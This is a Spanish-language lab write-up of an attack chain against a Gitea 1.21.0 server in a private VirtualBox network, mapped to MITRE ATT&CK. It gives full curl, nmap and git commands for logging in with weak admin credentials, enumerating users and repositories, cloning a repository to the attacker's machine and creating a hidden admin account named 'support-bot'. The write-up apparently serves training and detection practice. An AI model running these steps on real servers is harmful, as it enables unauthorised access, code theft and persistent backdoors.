# Día 9 - Ubuntu: Servicio DevOps expuesto (Gitea 1.21.0)

Operación Eslabón, 3 de julio de 2026.

## Objetivo

Ejecutar una cadena completa de ataque contra una instancia de Gitea 1.21.0 expuesta en Ubuntu. El vector de entrada es el descubrimiento de credenciales débiles en la API REST de Gitea, lo que da acceso administrativo completo al servidor. A partir de ahí se ejecuta Discovery, Collection, Exfiltración de repositorios y creación de un usuario backdoor para Persistence.

## Máquinas

Víctima: Ubuntu Server (192.168.1.96), Gitea 1.21.0 en puerto 3001  
Atacante: Kali Linux (192.168.1.132)  
Monitoreo: Auditd (separado — análisis Blue Team en Wazuh)

## Entorno

Ubuntu Server con Gitea 1.21.0 corriendo como proceso de usuario (`vboxuser`).  
Gitea usa SQLite3 como base de datos, sin HTTPS, sin rate limiting en la API.  
Usuario administrador `gitadmin` con contraseña `admin123` (credencial débil).  
Auditd activo (PID 518) desde el arranque del sistema.

## Desarrollo

### Eslabón 1: Reconnaissance (T1595, T1046)

Se ejecutó un escaneo de servicios con Nmap contra Ubuntu para identificar puertos abiertos y versiones.

**Comando:**
```bash
nmap -sV -p 3001 192.168.1.96
```

**Resultado:**
```
PORT     STATE SERVICE VERSION
3001/tcp open  http    Golang net/http server
Set-Cookie: i_like_gitea=d0c6e390fd4eedc5
<title>Gitea</title>
MAC Address: 08:00:27:FE:EB:70 (Oracle VirtualBox virtual NIC)
```

**Hallazgos:**
- Puerto 3001 abierto con servicio HTTP
- Golang net/http server → característico de Gitea
- Cookie `i_like_gitea` confirma que es Gitea
- Sin HTTPS → tráfico en claro

**Técnicas MITRE:** T1595 (Active Scanning), T1046 (Network Service Discovery)

---

### Eslabón 2: Initial Access (T1190, T1078)

Se probó la API REST de Gitea con credenciales débiles. Gitea expone el endpoint `/api/v1/user` que permite autenticación HTTP Basic y retorna información del usuario autenticado.

**Comando:**
```bash
curl -s http://192.168.1.96:3001/api/v1/user \
  -u gitadmin:admin123 | python3 -m json.tool
```

**Resultado:**
```json
{
    "id": 1,
    "login": "gitadmin",
    "login_name": "gitadmin",
    "email": "gitadmin@gitea.local",
    "is_admin": true,
    "active": true,
    "restricted": false,
    "last_login": "2026-07-03T19:43:48Z",
    "created": "2026-07-03T19:33:43Z",
    "username": "gitadmin"
}
```

**Hallazgos:**
- Credenciales `gitadmin:admin123` aceptadas
- Usuario con `is_admin: true` → acceso administrativo total
- Sin 2FA, sin rate limiting, sin bloqueo por intentos fallidos
- Contraseña trivial establecida durante la instalación inicial

**Técnicas MITRE:** T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts — Default Credentials)

---

### Eslabón 3: Discovery (T1087, T1213)

Con acceso admin confirmado, se enumeraron usuarios y repositorios del sistema.

**Comando — Enumerar usuarios:**
```bash
curl -s http://192.168.1.96:3001/api/v1/admin/users \
  -u gitadmin:admin123 | python3 -m json.tool
```

**Resultado:**
```json
[
    {
        "id": 1,
        "login": "gitadmin",
        "is_admin": true,
        "email": "gitadmin@gitea.local",
        "active": true
    }
]
```

**Comando — Enumerar repositorios:**
```bash
curl -s http://192.168.1.96:3001/api/v1/repos/search \
  -u gitadmin:admin123 | python3 -m json.tool | grep -E "full_name|private|description"
```

**Resultado:**
```
"full_name": "gitadmin/exploit-repo"
"description": "Test repo"
"private": false
```

**Hallazgos:**
- Un único usuario administrador en el sistema
- Un repositorio público identificado: `gitadmin/exploit-repo`
- La API admin no requiere token especial — solo credenciales básicas

**Técnicas MITRE:** T1087 (Account Discovery), T1213 (Data from Information Repositories)

---

### Eslabón 4: Collection (T1213)

Se leyó el contenido de los archivos del repositorio directamente via API, sin necesidad de clonar.

**Comando — Listar archivos del repo:**
```bash
curl -s http://192.168.1.96:3001/api/v1/repos/gitadmin/exploit-repo/contents/ \
  -u gitadmin:admin123 | python3 -m json.tool
```

**Resultado:**
```json
[
    {
        "name": "README.md",
        "path": "README.md",
        "size": 25,
        "download_url": "http://192.168.1.96:3001/gitadmin/exploit-repo/raw/branch/main/README.md"
    },
    {
        "name": "test.txt",
        "path": "test.txt",
        "size": 20,
        "download_url": "http://192.168.1.96:3001/gitadmin/exploit-repo/raw/branch/main/test.txt"
    }
]
```

**Comando — Leer contenido del README:**
```bash
curl -s http://192.168.1.96:3001/gitadmin/exploit-repo/raw/branch/main/README.md \
  -u gitadmin:admin123
```

**Resultado:**
```
# exploit-repo
Test repo
```

**Hallazgos:**
- La API permite leer el contenido de cualquier archivo sin restricciones
- En un entorno real, esto expone código fuente, secrets, API keys, configs, etc.
- No hay logging visible de acceso a archivos individuales

**Técnicas MITRE:** T1213 (Data from Information Repositories)

---

### Eslabón 5: Exfiltration (T1041)

Se clonó el repositorio completo a Kali Linux usando las credenciales comprometidas embebidas en la URL.

**Comando:**
```bash
cd /tmp
git clone http://gitadmin:admin123@192.168.1.96:3001/gitadmin/exploit-repo.git exfiltrado-repo
ls -la exfiltrado-repo/
```

**Resultado:**
```
Clonando en 'exfiltrado-repo'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0

total 8
drwxrwxr-x 3 d2 d2 100 jul 3 16:31 .
drwxrwxrwt 15 root root 380 jul 3 16:31 ..
drwxrwxr-x 7 d2 d2 240 jul 3 16:31 .git
-rw-rw-r-- 1 d2 d2 25 jul 3 16:31 README.md
-rw-rw-r-- 1 d2 d2 20 jul 3 16:31 test.txt
```

**Hallazgos:**
- Repositorio completo clonado en Kali incluyendo historial Git (`.git/`)
- Credenciales embebidas en URL → viajan en claro (sin HTTPS)
- En un entorno real, el historial Git puede contener secrets eliminados pero aún rastreables

**Técnicas MITRE:** T1041 (Exfiltration Over C2 Channel), T1213 (Data from Information Repositories)

---

### Eslabón 6: Persistence (T1136)

Se creó un usuario backdoor con nombre inocente (`support-bot`) y se elevó a administrador via API. El objetivo: mantener acceso aunque el admin legítimo cambie su contraseña.

**Paso 1 — Crear usuario:**
```bash
curl -s -X POST http://192.168.1.96:3001/api/v1/admin/users \
  -u gitadmin:admin123 \
  -H "Content-Type: application/json" \
  -d '{
    "username": "support-bot",
    "email": "support@gitea.local",
    "password": "S3cur3B@ck0or!",
    "must_change_password": false
  }' | python3 -m json.tool | grep -E "login|is_admin|id"
```

**Resultado:**
```json
"id": 2,
"login": "support-bot",
"is_admin": false
```

**Paso 2 — Elevar a admin:**
```bash
curl -s -X PATCH http://192.168.1.96:3001/api/v1/admin/users/support-bot \
  -u gitadmin:admin123 \
  -H "Content-Type: application/json" \
  -d '{
    "admin": true,
    "source_id": 0,
    "login_name": "support-bot"
  }' | python3 -m json.tool | grep -E "login|is_admin|id"
```

**Resultado:**
```json
"id": 2,
"login": "support-bot",
"is_admin": true
```

**Hallazgos:**
- Usuario backdoor `support-bot` creado con nombre que simula un bot legítimo
- Permisos admin en Gitea → acceso total a todos los repos y funciones
- El usuario admin legítimo no recibe ninguna notificación
- Contraseña fuerte: `S3cur3B@ck0or!` → no encontrable por fuerza bruta simple

**Técnicas MITRE:** T1136 (Create Account), T1136.001 (Create Account — Local Account)

---

## Técnicas MITRE ATT&CK

| Eslabón | Técnica | ID | Descripción |
|---------|---------|-----|-------------|
| Reconnaissance | Active Scanning | T1595 | Nmap contra puerto 3001 |
| Reconnaissance | Network Service Discovery | T1046 | Identificación de Gitea via banner |
| Initial Access | Exploit Public-Facing Application | T1190 | API REST sin protección |
| Initial Access | Valid Accounts — Default Credentials | T1078 | gitadmin:admin123 |
| Discovery | Account Discovery | T1087 | Enumeración de usuarios via API admin |
| Discovery | Data from Information Repositories | T1213 | Enumeración de repos via API |
| Collection | Data from Information Repositories | T1213 | Lectura de contenido de archivos via API |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | git clone con credenciales embebidas |
| Persistence | Create Account | T1136 | Usuario backdoor support-bot |
| Persistence | Create Account — Local Account | T1136.001 | Elevación a admin via API PATCH |

## Cabos sueltos

**Sin HTTPS:** Todo el tráfico de la API viajó en claro (HTTP). En un entorno real con HTTPS, las credenciales estarían cifradas en tránsito pero el ataque sería idéntico.

**Sin rate limiting:** Gitea 1.21.0 no tiene rate limiting en la API por defecto. Un ataque de fuerza bruta contra `/api/v1/user` podría descubrir credenciales automáticamente.

**Historial Git:** El `.git/` clonado contiene el historial completo de commits. En repos reales esto puede exponer secrets que fueron eliminados en commits posteriores pero permanecen en el historial.

**Sin notificaciones:** Gitea no notifica al administrador cuando se crea un nuevo usuario admin. La detección depende de revisión manual de usuarios o alertas de Auditd/Wazuh.

**Privilege Escalation:** No fue necesaria — las credenciales débiles dieron acceso admin directamente. En un escenario más endurecido, se necesitaría explotar una CVE específica de Gitea.

**Lateral Movement:** No ejecutado. Gitea corre como `vboxuser` sin privilegios especiales en el sistema. Para moverse lateralmente, se necesitaría escalar privilegios en Ubuntu primero.

## Conclusión

Se ejecutó una cadena de 6 eslabones contra Gitea 1.21.0:

1. **Reconnaissance** → Gitea 1.21.0 descubierto en puerto 3001
2. **Initial Access** → Credenciales débiles `gitadmin:admin123` via API
3. **Discovery** → Usuarios y repositorios enumerados
4. **Collection** → Contenido de repositorios leído via API
5. **Exfiltration** → Repositorio completo clonado a Kali
6. **Persistence** → Usuario backdoor `support-bot` con permisos admin

**El vector principal fue la combinación de:**
- Servicio DevOps expuesto sin HTTPS ni rate limiting
- Credenciales débiles establecidas en instalación inicial
- API REST con permisos admin sin autenticación de dos factores

Este patrón (servicio DevOps interno expuesto + credenciales débiles) es uno de los vectores más comunes en compromisos reales de infraestructura de desarrollo.

**Próximo: Día 10 - Windows, cadena completa con Impact (ransomware simulado) — T1486.**
